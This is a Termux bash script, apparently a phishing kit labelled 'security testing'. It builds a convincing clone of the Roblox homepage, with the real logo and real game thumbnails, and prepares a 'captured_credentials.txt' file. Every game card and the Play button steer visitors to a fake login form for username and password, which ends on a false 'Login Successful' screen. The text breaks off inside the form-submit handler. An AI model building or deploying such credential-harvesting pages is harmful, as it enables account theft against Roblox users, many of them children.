#!/data/data/com.termux/files/usr/bin/bash

# ============================================================
# Roblox Security Testing - FINAL WITH REAL IMAGES
# Real game thumbnails from Roblox CDN + Social Media Icons
# ============================================================

PORT="${1:-8080}"
DIR="$HOME/roblox_sim"
mkdir -p "$DIR"
CAP="$DIR/captured_credentials.txt"
> "$CAP"

cat > "$DIR/index.html" << 'ENDHTML'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Roblox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f13;color:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,sans-serif;-webkit-font-smoothing:antialiased}
.nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(15,15,19,0.95);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-bottom:1px solid #2a2a36;display:flex;align-items:center;justify-content:space-between;padding:0 20px;height:56px}
.nav-l{display:flex;align-items:center;gap:30px}
.nav-l svg{height:26px;flex-shrink:0}
.nav-links{display:flex;gap:22px}
.nav-links a{color:#a0a0b0;text-decoration:none;font-size:13px;font-weight:500;padding:4px 0;border-bottom:2px solid transparent;transition:.2s}
.nav-links a:hover,.nav-links a.active{color:#f5f5f5;border-color:#00a2ff}
.nav-r{display:flex;align-items:center;gap:12px}
.sbox{display:flex;align-items:center;gap:8px;background:#16161d;border:1px solid #2a2a36;border-radius:20px;padding:7px 14px;width:200px;transition:.2s}
.sbox:focus-within{border-color:#00a2ff;box-shadow:0 0 0 3px rgba(0,162,255,.15)}
.sbox input{background:0;border:0;outline:0;color:#f5f5f5;font-size:13px;width:100%}
.sbox input::placeholder{color:#6b6b7b}
.btn-l,.btn-s{padding:7px 18px;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;border:0;transition:.2s}
.btn-l{background:0;color:#f5f5f5;border:1px solid #2a2a36}
.btn-l:hover{background:#1c1c26;border-color:#6b6b7b}
.btn-s{background:#00a2ff;color:#fff}
.btn-s:hover{background:#0088dd}
.hero{padding:110px 20px 60px;text-align:center;background:linear-gradient(135deg,#0f0f13 0%,#15152a 50%,#0a1f33 100%);display:flex;align-items:center;justify-content:center;min-height:320px}
.hero-in{max-width:640px}
.hero-in h1{font-size:44px;font-weight:800;margin-bottom:12px;background:linear-gradient(135deg,#fff 20%,#00a2ff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hero-in p{font-size:16px;color:#a0a0b0;margin-bottom:28px}
.hb{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
.hbp{padding:13px 32px;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;border:0;transition:.2s}
.hbp.pr{background:#00a2ff;color:#fff;box-shadow:0 4px 20px rgba(0,162,255,.25)}
.hbp.pr:hover{background:#0088dd;transform:translateY(-2px)}
.hbp.sc{background:rgba(255,255,255,.08);color:#f5f5f5;border:1px solid rgba(255,255,255,.1)}
.hbp.sc:hover{background:rgba(255,255,255,.14)}
.gs{max-width:1280px;margin:0 auto;padding:36px 20px}
.sh{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:8px}
.sh h2{font-size:22px;font-weight:700}
.sh a{color:#00a2ff;text-decoration:none;font-size:13px;font-weight:600}
.sh a:hover{color:#0088dd}
.gg{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:18px}
.gc{background:#1c1c26;border-radius:12px;overflow:hidden;cursor:pointer;transition:.3s;border:1px solid transparent}
.gc:active{transform:translateY(-2px);border-color:#00a2ff}
.gc:hover{transform:translateY(-5px);border-color:#00a2ff;box-shadow:0 12px 36px rgba(0,0,0,.5)}
.gt{width:100%;aspect-ratio:16/9;display:block;object-fit:cover;background:#1c1c26}
.gi{padding:14px}
.gi h4{font-size:14px;font-weight:600;margin-bottom:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.gi .cr{font-size:12px;color:#6b6b7b;margin-bottom:6px}
.gs2{display:flex;gap:14px;font-size:12px;color:#a0a0b0}
.gs2 span{display:flex;align-items:center;gap:4px}
.ft{background:#16161d;border-top:1px solid #2a2a36;padding:44px 20px 24px;margin-top:40px}
.fi{max-width:1280px;margin:0 auto;display:grid;grid-template-columns:repeat(4,1fr);gap:36px}
.fc h4{font-size:14px;font-weight:700;margin-bottom:16px;color:#f5f5f5}
.fc a{display:block;color:#6b6b7b;text-decoration:none;font-size:13px;margin-bottom:10px;transition:.2s}
.fc a:hover{color:#f5f5f5}
.si{display:flex;gap:12px;flex-wrap:wrap}
.si a{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:10px;background:#1c1c26;transition:.2s;margin:0}
.si a:hover{background:#24242e;transform:translateY(-2px)}
.si a svg{width:20px;height:20px;fill:#a0a0b0;transition:.2s}
.si a:hover svg{fill:#f5f5f5}
.fb{max-width:1280px;margin:24px auto 0;padding-top:20px;border-top:1px solid #2a2a36;text-align:center;color:#6b6b7b;font-size:12px}
.mo{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:200;align-items:center;justify-content:center;padding:16px}
.mo.active{display:flex}
.m{background:#16161d;border-radius:16px;padding:40px 36px;width:100%;max-width:390px;position:relative;border:1px solid #2a2a36;box-shadow:0 10px 40px rgba(0,0,0,.5);animation:in .25s ease}
@keyframes in{from{opacity:0;transform:scale(.93)}to{opacity:1;transform:scale(1)}}
.mc{position:absolute;top:16px;right:18px;background:0;border:0;color:#6b6b7b;font-size:28px;cursor:pointer;line-height:1;transition:.2s}
.mc:hover{color:#f5f5f5}
.ml{text-align:center;margin-bottom:4px}
.ml svg{height:32px}
.m h3{text-align:center;font-size:22px;font-weight:700;margin:16px 0 24px}
.ig{margin-bottom:16px}
.ig label{display:block;font-size:13px;font-weight:600;color:#a0a0b0;margin-bottom:6px}
.ig input{width:100%;padding:12px 14px;background:#0f0f13;border:1px solid #2a2a36;border-radius:8px;color:#f5f5f5;font-size:15px;outline:0;transition:.2s}
.ig input:focus{border-color:#00a2ff;box-shadow:0 0 0 3px rgba(0,162,255,.2)}
.ig input::placeholder{color:#6b6b7b}
.fo{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;font-size:13px;flex-wrap:wrap;gap:8px}
.fo label{display:flex;align-items:center;gap:6px;color:#a0a0b0;cursor:pointer;font-size:13px}
.fo input[type="checkbox"]{accent-color:#00a2ff;width:16px;height:16px}
.fo a{color:#00a2ff;text-decoration:none;font-size:13px}
.fo a:hover{text-decoration:underline}
.sb{width:100%;padding:13px;background:#00a2ff;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;transition:.2s}
.sb:hover{background:#0088dd}
.sb:disabled{opacity:.5;cursor:default}
.rl{text-align:center;margin-top:18px;font-size:13px;color:#6b6b7b}
.rl a{color:#00a2ff;text-decoration:none}
.rl a:hover{text-decoration:underline}
.ls{display:none;text-align:center;padding:20px 0}
.ls.active{display:block}
.sp{width:38px;height:38px;border:3px solid #2a2a36;border-top-color:#00a2ff;border-radius:50%;margin:0 auto 12px;animation:sp .8s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.ls p{color:#a0a0b0;font-size:14px}
.sm{text-align:center;padding:44px 36px}
.si2{width:68px;height:68px;border-radius:50%;background:#00d154;color:#fff;font-size:32px;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
.sm h3{color:#00d154;margin-bottom:8px}
.sm p{color:#a0a0b0;font-size:15px}
.sm .ss{margin-top:8px;font-size:13px;color:#6b6b7b}
@media(max-width:900px){.nav-links{display:none}.sbox{width:150px}}
@media(max-width:650px){
  .sbox{display:none}
  .hero-in h1{font-size:28px}
  .gg{grid-template-columns:repeat(2,1fr);gap:12px}
  .fi{grid-template-columns:repeat(2,1fr);gap:24px}
  .m{padding:30px 24px}
  .hero{padding:90px 16px 40px;min-height:auto}
  .hero-in p{font-size:14px}
  .gi{padding:10px}
  .gi h4{font-size:13px}
}
@media(max-width:400px){
  .gg{gap:8px}
  .btn-s{display:none}
  .gi{padding:8px}
  .gi h4{font-size:12px}
  .gs2{font-size:11px}
}
</style>
</head>
<body>

<nav class="nav">
  <div class="nav-l">
    <svg viewBox="0 0 800 148" fill="#f5f5f5"><rect width="800" height="148" fill="none"/><g><path d="M42.5 18.5h28.2l35.3 57.3V18.5h27.7v92.5h-27.2L70.2 53v58H42.5V18.5zM153 18.5h54.5v24.3H180V58h25.5v24.3H180v30.2h-27V18.5zM219.5 18.5h26.5l27.5 46.5 27.5-46.5h26.5v92.5h-27V60l-27 45h-.5l-27-45v51h-27V18.5zM356.5 18.5H410v24.3h-26.5v7.5h25.5v24.3h-25.5v12h28V111h-55V18.5zM421.5 18.5h50.5c27 0 46.5 18 46.5 46.5s-19.5 46-46.5 46h-50.5V18.5zm28.5 24.3v43.5h19c14 0 21.5-9.5 21.5-21.8s-7.5-21.7-21.5-21.7h-19zM531 18.5h54.5v24.3H558V58h25.5v24.3H558v30.2h-27V18.5zM597.5 18.5h50.5c27 0 46.5 18 46.5 46.5s-19.5 46-46.5 46h-50.5V18.5zm28.5 24.3v43.5h19c14 0 21.5-9.5 21.5-21.8s-7.5-21.7-21.5-21.7h-19zM706 18.5h29.5l29.5 49V18.5H793v92.5h-25l-32-52.5v52.5h-30V18.5z"/></g></svg>
    <div class="nav-links">
      <a href="#" class="active">Discover</a>
      <a href="#">Create</a>
      <a href="#">Avatar</a>
      <a href="#">Marketplace</a>
    </div>
  </div>
  <div class="nav-r">
    <div class="sbox">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#a0a0b0" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
      <input type="text" placeholder="Search games, creators, and more">
    </div>
    <button class="btn-l" id="loginBtn">Log In</button>
    <button class="btn-s">Sign Up</button>
  </div>
</nav>

<section class="hero">
  <div class="hero-in">
    <h1>Welcome to Roblox</h1>
    <p>Explore millions of games created by a global community. Play with friends, create your own worlds, and discover endless adventures.</p>
    <div class="hb">
      <button class="hbp pr" id="playBtn">Play Now</button>
      <button class="hbp sc">Learn More</button>
    </div>
  </div>
</section>

<section class="gs">
  <div class="sh"><h2>Popular Games</h2><a href="#">See All &rarr;</a></div>
  <div class="gg" id="g1"></div>
</section>
<section class="gs">
  <div class="sh"><h2>Trending Now</h2><a href="#">See All &rarr;</a></div>
  <div class="gg" id="g2"></div>
</section>
<section class="gs">
  <div class="sh"><h2>Recommended For You</h2><a href="#">See All &rarr;</a></div>
  <div class="gg" id="g3"></div>
</section>

<footer class="ft">
  <div class="fi">
    <div class="fc">
      <h4>About</h4>
      <a href="#">About Roblox</a><a href="#">Careers</a><a href="#">Press</a><a href="#">Blog</a>
    </div>
    <div class="fc">
      <h4>Support</h4>
      <a href="#">Help</a><a href="#">Safety</a><a href="#">Terms</a><a href="#">Privacy</a>
    </div>
    <div class="fc">
      <h4>Community</h4>
      <a href="#">Forum</a><a href="#">Developers</a><a href="#">Creators</a><a href="#">Events</a>
    </div>
    <div class="fc">
      <h4>Follow Us</h4>
      <div class="si">
        <!-- Twitter / X -->
        <a href="#">
          <svg viewBox="0 0 16 16"><path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865l8.875 11.633Z"/></svg>
        </a>
        <!-- Instagram -->
        <a href="#">
          <svg viewBox="0 0 16 16"><path d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z"/></svg>
        </a>
        <!-- YouTube -->
        <a href="#">
          <svg viewBox="0 0 16 16"><path d="M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z"/></svg>
        </a>
        <!-- Facebook -->
        <a href="#">
          <svg viewBox="0 0 16 16"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg>
        </a>
      </div>
    </div>
  </div>
  <div class="fb"><p>&copy; 2026 Roblox Corporation. All rights reserved.</p></div>
</footer>

<div class="mo" id="loginModal">
  <div class="m">
    <button class="mc" id="closeBtn">&times;</button>
    <div class="ml">
      <svg viewBox="0 0 800 148" fill="#f5f5f5"><rect width="800" height="148" fill="none"/><g><path d="M42.5 18.5h28.2l35.3 57.3V18.5h27.7v92.5h-27.2L70.2 53v58H42.5V18.5zM153 18.5h54.5v24.3H180V58h25.5v24.3H180v30.2h-27V18.5zM219.5 18.5h26.5l27.5 46.5 27.5-46.5h26.5v92.5h-27V60l-27 45h-.5l-27-45v51h-27V18.5zM356.5 18.5H410v24.3h-26.5v7.5h25.5v24.3h-25.5v12h28V111h-55V18.5zM421.5 18.5h50.5c27 0 46.5 18 46.5 46.5s-19.5 46-46.5 46h-50.5V18.5zm28.5 24.3v43.5h19c14 0 21.5-9.5 21.5-21.8s-7.5-21.7-21.5-21.7h-19zM531 18.5h54.5v24.3H558V58h25.5v24.3H558v30.2h-27V18.5zM597.5 18.5h50.5c27 0 46.5 18 46.5 46.5s-19.5 46-46.5 46h-50.5V18.5zm28.5 24.3v43.5h19c14 0 21.5-9.5 21.5-21.8s-7.5-21.7-21.5-21.7h-19zM706 18.5h29.5l29.5 49V18.5H793v92.5h-25l-32-52.5v52.5h-30V18.5z"/></g></svg>
    </div>
    <h3>Log In</h3>
    <form id="loginForm">
      <div class="ig">
        <label for="user">Username / Email / Phone</label>
        <input type="text" id="user" name="user" placeholder="Enter username, email, or phone" required>
      </div>
      <div class="ig">
        <label for="pass">Password</label>
        <input type="password" id="pass" name="pass" placeholder="Enter password" required>
      </div>
      <div class="fo">
        <label><input type="checkbox" checked> Remember me</label>
        <a href="#">Forgot password?</a>
      </div>
      <button type="submit" class="sb" id="subBtn">Log In</button>
      <p class="rl">New to Roblox? <a href="#">Register</a></p>
    </form>
    <div class="ls" id="loadSpin">
      <div class="sp"></div>
      <p>Verifying credentials...</p>
    </div>
  </div>
</div>

<div class="mo" id="successModal">
  <div class="m sm">
    <div class="si2">&#10003;</div>
    <h3>Login Successful!</h3>
    <p>Welcome back, <strong id="dispUser"></strong>!</p>
    <p class="ss">Redirecting you to your dashboard...</p>
  </div>
</div>

<script>
// ===== REAL ROBLOX GAME DATA with CDN THUMBNAILS =====
var G = [
  {n:"Adopt Me!", c:"DreamCraft", p:"842K", l:"4.2M", img:"https://tr.rbxcdn.com/180DAY-014a649ffd917a52e7fa034bd08e0ef6/768/432/Image/Png/noFilter"},
  {n:"Brookhaven RP", c:"WolfPack", p:"731K", l:"3.8M", img:"https://tr.rbxcdn.com/180DAY-734199b096c5b86bc37a4f5e75edcd3d/768/432/Image/Png/noFilter"},
  {n:"Blox Fruits", c:"Gamer Robot", p:"689K", l:"3.5M", img:"https://tr.rbxcdn.com/180DAY-e1ce51abae5188805c3fee78ec7f4d08/768/432/Image/Png/noFilter"},
  {n:"Tower of Hell", c:"Yardstick", p:"512K", l:"2.1M", img:"https://tr.rbxcdn.com/180DAY-538a00b065e7171b3a3187480f07ed9d/768/432/Image/Png/noFilter"},
  {n:"Royale High", c:"Callmehbob", p:"543K", l:"3.3M", img:"https://tr.rbxcdn.com/180DAY-70b4621b91ca0769c50ff958df4d9494/768/432/Image/Png/noFilter"},
  {n:"MeepCity", c:"Alex Newtron", p:"423K", l:"2.8M", img:"https://tr.rbxcdn.com/180DAY-315e29556054777604420711cb64f0b6/768/432/Image/Png/noFilter"},
  {n:"Murder Mystery 2", c:"Nikilis", p:"367K", l:"2.4M", img:"https://tr.rbxcdn.com/180DAY-fe7335c3ad752e84323cd81ae38de69a/768/432/Image/Png/noFilter"},
  {n:"Jailbreak", c:"Badimo", p:"298K", l:"3.1M", img:"https://tr.rbxcdn.com/180DAY-fef285ce1b8ac805b17da2a4f998ccec/768/432/Image/Png/noFilter"},
  {n:"Piggy", c:"MiniToon", p:"198K", l:"1.7M", img:"https://t6.rbxcdn.com/180DAY-3de571ed1175636497776c44426b9765"},
  {n:"Arsenal", c:"Rolve", p:"256K", l:"1.9M", img:"https://tr.rbxcdn.com/180DAY-fd5d29ef7df403915891862d02ae09bb/768/432/Image/Png/noFilter"},
  {n:"Phantom Forces", c:"StyLiS", p:"187K", l:"1.5M", img:"https://tr.rbxcdn.com/180DAY-bf6f7058336de36c002dc58d33e9c101/768/432/Image/Png/noFilter"},
  {n:"Natural Disaster", c:"Stickmaster", p:"165K", l:"1.3M", img:"https://tr.rbxcdn.com/180DAY-7ea7065a02f8cff80f8b0270a9ad2d3b/768/432/Image/Png/noFilter"}
];

function render(arr, el){
  var h = '';
  for(var i=0;i<arr.length;i++){
    var g = arr[i];
    h += '<div class="gc" onclick="document.getElementById(\'loginBtn\').click()">'+
      '<img class="gt" src="'+g.img+'" alt="'+g.n+'" loading="lazy" onerror="this.style.display=\'none\'">'+
      '<div class="gi"><h4>'+g.n+'</h4>'+
      '<div class="cr">by '+g.c+'</div>'+
      '<div class="gs2"><span>&#9679; '+g.p+' players</span><span>&#10084; '+g.l+'</span></div></div></div>';
  }
  el.innerHTML = h;
}

render(G, document.getElementById('g1'));
render(G.slice().reverse(), document.getElementById('g2'));
render(G.slice().sort(function(){return 0.5-Math.random()}), document.getElementById('g3'));

// ===== MODAL =====
var modal = document.getElementById('loginModal');
var sModal = document.getElementById('successModal');
var form = document.getElementById('loginForm');
var uInp = document.getElementById('user');
var pInp = document.getElementById('pass');
var subBtn = document.getElementById('subBtn');
var spin = document.getElementById('loadSpin');
var dU = document.getElementById('dispUser');

function openM(){
  modal.classList.add('active');
  document.body.style.overflow = 'hidden';
  setTimeout(function(){uInp.focus()},100);
}
function closeM(){
  modal.classList.remove('active');
  form.style.display = 'block';
  spin.classList.remove('active');
  subBtn.disabled = false;
  form.reset();
  document.body.style.overflow = '';
}

document.getElementById('loginBtn').onclick = openM;
document.getElementById('playBtn').onclick = openM;
document.getElementById('closeBtn').onclick = closeM;
modal.onclick = function(e){if(e.target===modal) closeM()};
document.onkeydown = function(e){if(e.key==='Escape'&&modal.classList.contains('active')) closeM()};

form.onsubmit = function(e){
  e.preventDefau
